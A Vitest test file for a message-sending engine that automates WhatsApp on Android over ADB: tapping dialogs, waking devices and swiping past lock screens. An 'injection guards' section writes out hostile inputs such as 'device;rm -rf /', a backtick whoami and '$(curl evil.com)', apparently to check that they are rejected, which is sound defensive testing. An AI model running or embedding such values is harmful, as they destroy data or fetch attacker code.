import { describe, it, expect, beforeEach, vi } from 'vitest'
import Database from 'better-sqlite3'
import { SendEngine } from './send-engine.js'
import { SendStrategy } from './send-strategy.js'
import { MessageQueue } from '../queue/index.js'
import { DispatchEmitter } from '../events/index.js'
import type { AdbBridge } from '../adb/index.js'

function createMockAdb(): AdbBridge {
  return {
    shell: vi.fn().mockResolvedValue(''),
    screenshot: vi.fn().mockResolvedValue(Buffer.from('fake-png')),
    discover: vi.fn().mockResolvedValue([]),
    forward: vi.fn().mockResolvedValue(undefined),
    pull: vi.fn().mockResolvedValue(Buffer.from('')),
  } as unknown as AdbBridge
}

/** XML with chat input ready + send button */
const CHAT_READY_XML = `<hierarchy>
  <node resource-id="com.whatsapp:id/entry" bounds="[50,1400][850,1500]" />
  <node resource-id="com.whatsapp:id/send" bounds="[900,1600][1000,1700]" />
</hierarchy>`

/** Stub UIAutomator, contact, power, and window queries so send() can complete */
function stubShellForSend(mockAdb: AdbBridge): void {
  const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
  shellMock.mockImplementation(async (_serial: string, cmd: string) => {
    if (cmd.includes('pidof')) return '12345'
    if (cmd.includes('uiautomator dump')) return ''
    if (cmd.includes('cat /sdcard/dispatch-ui.xml')) return CHAT_READY_XML
    if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
      return 'display_name=Test'
    }
    if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
    if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
    return ''
  })
}

describe('SendEngine', () => {
  let db: Database.Database
  let queue: MessageQueue
  let emitter: DispatchEmitter
  let mockAdb: AdbBridge
  let engine: SendEngine

  beforeEach(() => {
    db = new Database(':memory:')
    db.pragma('journal_mode = WAL')
    queue = new MessageQueue(db)
    queue.initialize()
    emitter = new DispatchEmitter()
    mockAdb = createMockAdb()
    const strategy = new SendStrategy({ prefillWeight: 100, searchWeight: 0, typingWeight: 0 })
    engine = new SendEngine(mockAdb, queue, emitter, strategy)

    // Mock internal delay to avoid real waits (~8s per send)
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    vi.spyOn(engine as any, 'delay').mockResolvedValue(undefined)
  })

  /** Enqueue and return the real DB message */
  const enqueueMsg = (key = 'key-1') =>
    queue.enqueue({ to: '5543991938235', body: 'Hi', idempotencyKey: key, senderNumber: '5543996835100' })

  describe('send() — user switching at batch level', () => {
    it('does NOT call am switch-user (handled by worker loop)', async () => {
      const msg = enqueueMsg()
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const switchCalls = calls.filter((cmd: string) => cmd.includes('am switch-user'))
      expect(switchCalls).toHaveLength(0)
    })

    it('does NOT include --user flag in am start (user already switched)', async () => {
      const msg = enqueueMsg()
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const amStartCalls = calls.filter((cmd: string) => cmd.includes('am start') && !cmd.includes('force-stop'))
      expect(amStartCalls).toHaveLength(1)
      expect(amStartCalls[0]).not.toContain('--user')
    })

    it('force-stops WhatsApp in ensureCleanState', async () => {
      const msg = enqueueMsg('clean-1')
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      expect(calls.some((cmd: string) => cmd.includes('am force-stop com.whatsapp'))).toBe(true)
    })

    it('emits message:sending and message:sent events', async () => {
      const msg = enqueueMsg()
      stubShellForSend(mockAdb)

      const events: string[] = []
      emitter.on('message:sending', () => events.push('sending'))
      emitter.on('message:sent', () => events.push('sent'))

      await engine.send(msg, 'device-1')

      expect(events).toEqual(['sending', 'sent'])
    })

    it('returns screenshot buffer, duration, and audit metadata', async () => {
      const msg = enqueueMsg()
      stubShellForSend(mockAdb)

      const result = await engine.send(msg, 'device-1')

      expect(result.screenshot).toBeInstanceOf(Buffer)
      expect(result.durationMs).toBeGreaterThanOrEqual(0)
      expect(typeof result.contactRegistered).toBe('boolean')
      expect(typeof result.dialogsDismissed).toBe('number')
    })
  })

  describe('dialog detection', () => {
    it('dismisses "Enviar para" chooser and taps WhatsApp + Sempre', async () => {
      const msg = enqueueMsg('dialog-1')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          // 1st dump: show "Enviar para" dialog
          if (dumpCount === 1) {
            return '<hierarchy><node text="Enviar para" bounds="[50,50][500,100]" /><node text="WhatsApp" bounds="[100,200][400,260]" /></hierarchy>'
          }
          // 2nd dump: show "Sempre" button
          if (dumpCount === 2) {
            return '<hierarchy><node text="Sempre" bounds="[200,500][400,560]" /></hierarchy>'
          }
          // 3rd dump onward: chat ready
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
        return ''
      })

      await engine.send(msg, 'device-1')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.includes('input tap'))
      // Should have taps: WhatsApp option, Sempre, send button
      expect(tapCalls.length).toBeGreaterThanOrEqual(2)
    })

    it('dismisses "Continuar" button', async () => {
      const msg = enqueueMsg('dialog-2')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) {
            return '<hierarchy><node text="Continuar" bounds="[200,800][500,860]" /></hierarchy>'
          }
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
        return ''
      })

      await engine.send(msg, 'device-1')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.includes('input tap'))
      // Continuar tap + send button tap
      expect(tapCalls.length).toBeGreaterThanOrEqual(2)
    })

    it('dismisses "Permitir" notification permission', async () => {
      const msg = enqueueMsg('dialog-3')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) {
            return '<hierarchy><node text="Permitir" bounds="[300,900][500,960]" /></hierarchy>'
          }
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
        return ''
      })

      await engine.send(msg, 'device-1')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.includes('input tap'))
      expect(tapCalls.length).toBeGreaterThanOrEqual(2)
    })

    it('throws transient error when chat input never appears', async () => {
      const msg = enqueueMsg('dialog-4')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          return '<hierarchy><node text="Loading..." /></hierarchy>'
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
        return ''
      })

      await expect(engine.send(msg, 'device-1')).rejects.toThrow('Chat input not ready')
    })
  })

  describe('injection guards', () => {
    it('rejects unknown app packages', async () => {
      const msg = enqueueMsg('guard-1')
      await expect(engine.send(msg, 'device-1', true, 'com.evil.app')).rejects.toThrow('Rejected app package')
    })

    it('rejects shell metacharacters in app package', async () => {
      const msg = enqueueMsg('guard-2')
      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp;rm -rf /')).rejects.toThrow('Rejected app package')
    })

    it('rejects unsafe device serial', async () => {
      const msg = enqueueMsg('guard-3')
      await expect(engine.send(msg, 'device;rm -rf /', true)).rejects.toThrow('Rejected device serial')
    })

    it('rejects backtick injection in device serial', async () => {
      const msg = enqueueMsg('guard-4')
      await expect(engine.send(msg, '`whoami`', true)).rejects.toThrow('Rejected device serial')
    })

    it('rejects $() subshell in device serial', async () => {
      const msg = enqueueMsg('guard-5')
      await expect(engine.send(msg, '$(curl evil.com)', true)).rejects.toThrow('Rejected device serial')
    })

    it('allows valid com.whatsapp package', async () => {
      const msg = enqueueMsg('guard-6')
      stubShellForSend(mockAdb)
      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp')).resolves.toBeDefined()
    })

    it('allows valid com.whatsapp.w4b package', async () => {
      const msg = enqueueMsg('guard-7')
      stubShellForSend(mockAdb)
      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp.w4b')).resolves.toBeDefined()
    })
  })

  describe('withTimeout', () => {
    it('rejects when operation exceeds timeout', async () => {
      // Access the private method via prototype for unit testing
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const slow = new Promise<string>((resolve) => {
        setTimeout(() => resolve('done'), 60_000)
      })

      await expect(engineAny.withTimeout(slow, 50, 'testOp')).rejects.toThrow('Timeout: testOp exceeded 50ms')
    })

    it('resolves when operation completes within timeout', async () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const fast = Promise.resolve('ok')

      const result = await engineAny.withTimeout(fast, 5000, 'fastOp')
      expect(result).toBe('ok')
    })
  })

  describe('pre-send health check', () => {
    it('always sends KEYCODE_WAKEUP proactively', async () => {
      const msg = enqueueMsg('health-1')
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      expect(calls.some((cmd: string) => cmd.includes('KEYCODE_WAKEUP'))).toBe(true)
    })

    it('swipes to unlock if lock screen is showing', async () => {
      const msg = enqueueMsg('health-2')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=true'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) return CHAT_READY_XML
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        return ''
      })

      await engine.send(msg, 'device-1')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      expect(calls.some((cmd: string) => cmd.includes('input swipe'))).toBe(true)
    })
  })
})
